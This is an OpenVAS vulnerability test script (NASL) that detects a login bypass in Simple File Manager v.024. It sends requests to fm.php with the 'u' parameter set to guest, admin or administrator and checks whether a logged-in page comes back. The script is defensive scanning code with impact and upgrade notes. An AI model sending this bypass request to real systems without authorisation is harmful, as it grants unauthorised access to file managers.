###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_simple_filemanager_login_bypass_vuln.nasl 30244 2013-06-19 13:47:05Z jun$
#
# Simple File Manager Login Bypass Vulnerability
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803666");
  script_version("$Revision: 11865 $");
  script_bugtraq_id(60579);
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-06-19 13:47:05 +0530 (Wed, 19 Jun 2013)");
  script_name("Simple File Manager Login Bypass Vulnerability");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/85008");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/26246");
  script_xref(name:"URL", value:"http://cxsecurity.com/issue/WLB-2013060142");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/php/simple-file-manager-v024-login-bypass-vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation allow attackers to bypass security restrictions and
  gain unauthorized access, other attacks may also be possible.");
  script_tag(name:"affected", value:"Simple File Manager version v.024, other versions may also be affected.");
  script_tag(name:"insight", value:"The flaw is due improper verification of access permissions by the fm.php
  script, via 'u' parameter.");
  script_tag(name:"solution", value:"Upgrade to Simple File Manager version v.025 or later.");
  script_tag(name:"summary", value:"This host is running simple file manager and is prone to login
  bypass vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://onedotoh.sourceforge.net");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/sfm", "/filemanager", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir,"/fm.php"),  port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

  if('>Simple File Manager' >< rcvRes)
  {
    ## Create a list of user names to try, by default it will be guest
    foreach user (make_list("guest", "admin", "administrator"))
    {
      req = http_get(item:string(dir, "/fm.php?u=", user),  port:port);
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

      if('Home' >< res && 'logout' >< res){
       security_message(port:port);
       exit(0);
      }
    }
  }
}

exit(99);